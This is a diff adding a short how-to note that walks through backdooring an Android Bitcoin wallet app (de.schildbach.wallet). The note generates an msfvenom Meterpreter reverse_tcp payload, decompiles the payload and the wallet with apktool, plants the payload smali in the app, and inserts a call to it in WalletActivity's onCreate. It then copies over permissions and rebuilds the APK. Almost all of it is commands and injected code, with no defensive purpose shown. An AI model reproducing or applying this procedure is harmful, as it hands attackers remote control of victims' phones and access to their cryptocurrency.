@@ -1,0 +1,63 @@
+first download apk from apkmonk
+
+
+create payload using msfvenom 
+
+cmd > msfvenom -p android/meterpreter/reverse_tcp LHOST=92.168.43.219 LPORT=1234 R > payload.apk
+  ===> -p payload R > output to
+
+decompile payload.apk with apktool
+
+cmd > apktool d -f payload.apk -o payload    
+ ===> d ==decompile
+      -f ==file of apk
+      -o ==output
+      
+now decompile downloaded apk
+cmd >  apktool d -f de.schildbach.wallet_2023-11-17.apk -o /home/dragon/Desktop  
+
+create a metaspolit stage folder in smali folder
+
+cd smali
+cd com
+mkdir metaspolit 
+cd metaspolit
+mkdir stage
+cd stage
+
+
+copy the payload.smali into downloadedapk/smali/com/metaspolit/stage/
+
+
+now open manisation file and search for instance
+
+ <activity-alias android:exported="true" android:name="de.schildbach.wallet.WalletActivity" android:targetActivity="de.schildbach.wallet.ui.WalletActivity">
+            <intent-filter android:label="@string/app_name_short">
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
+                <data android:mimeType="application/x-btctx"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <meta-data android:name="android.app.shortcuts" android:resource="@xml/shortcuts"/>
+        </activity-alias>
+        
+and the go to the instance folder : de.schildbach.wallet.ui.WalletActivity
+cd /home/dragon/Desktop/originalapk/smali/de/schildbach/wallet/ui
+
+
+
+search for landroid/os/Bundle or oncreate function
+
+    invoke-super {p0, p1}, Lde/schildbach/wallet/ui/AbstractWalletActivity;->onCreate(Landroid/os/Bundle;)V  ==>below this
+    invoke-static {p0}, Lcom/metaspolit/stage/payload;->onCreate(Landroid/content/Context;)V                ======> add this line code
+    
+    
+Now open manfeation file of payload and copy require permissions and paste them in the menifestation file of downloadedapk and then recompile the downloadedapk
+cmd > apktool b /originalfolder 
+  ====> b == build
+      
+
+ 
